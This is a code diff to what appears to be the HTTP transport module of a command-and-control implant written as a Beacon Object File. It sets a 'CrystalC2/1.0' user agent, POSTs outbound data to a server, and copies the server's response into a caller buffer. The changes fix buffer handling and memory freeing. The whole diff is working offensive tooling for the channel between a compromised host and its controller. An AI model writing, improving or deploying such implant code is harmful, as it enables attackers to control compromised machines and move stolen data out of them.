@@ -4,6 +4,8 @@
 DECLSPEC_IMPORT errno_t WINAPIV MSVCRT$strcpy_s ( char *, rsize_t, const char * );
 DECLSPEC_IMPORT void    WINAPIV MSVCRT$free     ( void * );
 
+#define memcpy(x, y, z) __movsb ( ( UCHAR * ) x, ( UCHAR * ) y, z );
+
 HttpHandle * g_client;
 
 void udc2_init ( )
@@ -14,7 +16,7 @@ void udc2_init ( )
     MSVCRT$strcpy_s ( g_client->user_agent, sizeof ( g_client->user_agent ), "CrystalC2/1.0" );
 }
 
-int udc2_go ( const char * out_data, const size_t out_data_len, char ** in_data, size_t * in_data_len )
+int udc2_go ( const char * out_data, const size_t out_data_len, char * in_data, size_t * in_data_len )
 {
     HttpHeader headers_array [ 2 ];
 
@@ -29,13 +31,20 @@ int udc2_go ( const char * out_data, const size_t out_data_len, char ** in_data,
     HttpResponse response = { 0 };
     BOOL success          = HttpRequest ( g_client, HTTP_METHOD_POST, &uri, &headers, &body, &response );
 
-    if ( success )
+    if ( success && in_data != NULL && in_data_len != NULL )
     {
-        * in_data_len = response.body_size;
-        * in_data     = response.body;
+        size_t len_to_copy = response.body_size;
 
-        MSVCRT$free ( response.content_type );
+        if ( len_to_copy > * in_data_len ) {
+            len_to_copy = * in_data_len;
+        }
+
+        memcpy ( in_data, response.body, len_to_copy );
+        * in_data_len = len_to_copy;
     }
+
+    MSVCRT$free ( response.content_type );
+    MSVCRT$free ( response.body );
 
     return success;
 }
